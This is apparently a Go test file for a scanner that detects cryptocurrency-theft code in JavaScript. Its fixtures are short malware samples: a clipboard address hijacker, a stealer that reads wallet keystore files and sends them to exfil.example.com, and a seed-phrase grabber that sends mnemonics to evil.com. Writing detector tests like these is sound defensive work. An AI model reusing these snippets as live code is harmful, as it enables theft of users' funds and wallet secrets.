package analyzer

import (
	"strings"
	"testing"
)

func TestCryptoTheftAnalyzer_WalletAddressRegex(t *testing.T) {
	a := NewCryptoTheftAnalyzer()
	content := `
const targetWallet = '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD08';
const btcWallet = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
function replaceClipboard(text) {
	if (text.match(/^0x[a-fA-F0-9]{40}$/)) {
		return targetWallet;
	}
	return text;
}
`
	findings := a.scanContent(content, "clipper.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "wallet") || strings.Contains(f.Title, "Wallet") || strings.Contains(f.Title, "crypto") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect cryptocurrency wallet addresses")
	}
}

func TestCryptoTheftAnalyzer_ClipboardHijack(t *testing.T) {
	a := NewCryptoTheftAnalyzer()
	content := `
const clipboard = require('clipboardy');
const addr = '0xDEADBEEF00000000000000000000000000000000';
setInterval(async () => {
	const text = await clipboard.read();
	if (text.match(/^0x[a-fA-F0-9]{40}$/)) {
		await clipboard.write(addr);
	}
}, 1000);
`
	findings := a.scanContent(content, "hijack.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "clipboard") || strings.Contains(f.Title, "Clipboard") || strings.Contains(f.Title, "hijack") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect clipboard hijacking for crypto addresses")
	}
}

func TestCryptoTheftAnalyzer_PrivateKeySearch(t *testing.T) {
	a := NewCryptoTheftAnalyzer()
	content := `
const fs = require('fs');
const path = require('path');
const home = process.env.HOME;
// Search for wallet files
const walletPaths = [
	path.join(home, '.ethereum', 'keystore'),
	path.join(home, '.bitcoin', 'wallet.dat'),
	path.join(home, 'AppData', 'Roaming', 'Ethereum', 'keystore'),
];
walletPaths.forEach(p => {
	if (fs.existsSync(p)) {
		const data = fs.readFileSync(p);
		fetch('https://exfil.example.com', { method: 'POST', body: data });
	}
});
`
	findings := a.scanContent(content, "stealer.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "wallet") || strings.Contains(f.Title, "Wallet") || strings.Contains(f.Title, "key") || strings.Contains(f.Title, "Key") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect wallet file searching/exfiltration")
	}
}

func TestCryptoTheftAnalyzer_SeedPhraseExtraction(t *testing.T) {
	a := NewCryptoTheftAnalyzer()
	content := `
// Capture seed phrase input
document.querySelector('#seed-input').addEventListener('input', (e) => {
	const words = e.target.value.split(' ');
	if (words.length >= 12) {
		navigator.sendBeacon('https://evil.com/seeds', JSON.stringify({mnemonic: words}));
	}
});
`
	findings := a.scanContent(content, "phish.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "seed") || strings.Contains(f.Title, "Seed") || strings.Contains(f.Title, "mnemonic") || strings.Contains(f.Title, "Mnemonic") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect seed phrase/mnemonic capture")
	}
}

func TestCryptoTheftAnalyzer_CleanCode(t *testing.T) {
	a := NewCryptoTheftAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/balance', (req, res) => {
	res.json({ balance: 100 });
});
app.listen(3000);
`
	findings := a.scanContent(content, "clean.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}
